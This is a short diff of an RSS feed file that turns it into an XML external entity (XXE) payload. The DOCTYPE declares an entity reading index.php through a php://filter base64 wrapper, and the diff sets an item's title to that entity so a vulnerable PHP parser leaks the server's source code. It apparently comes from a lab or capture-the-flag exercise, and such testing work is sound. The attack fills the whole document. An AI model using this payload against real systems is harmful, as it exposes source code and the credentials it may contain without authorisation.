@@ -1,6 +1,6 @@
 <?xml version="1.0" ?>
 <!DOCTYPE data [
-    <!ELEMENT description (#ANY)>
+    <!ELEMENT title ANY>
     <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 ]>
 <rss version="2.0">
@@ -18,7 +18,7 @@
       <description>Tout  savoir sur RSS</description>
    </item>
    <item>
-     <title>Nouvelle  du lendemain</title>
+     <title>&file;</title>
     <link>https://www.xul.fr/xml-rdf.php</link> 
     <description>Et  tout savoir sur RDF</description>
    </item>
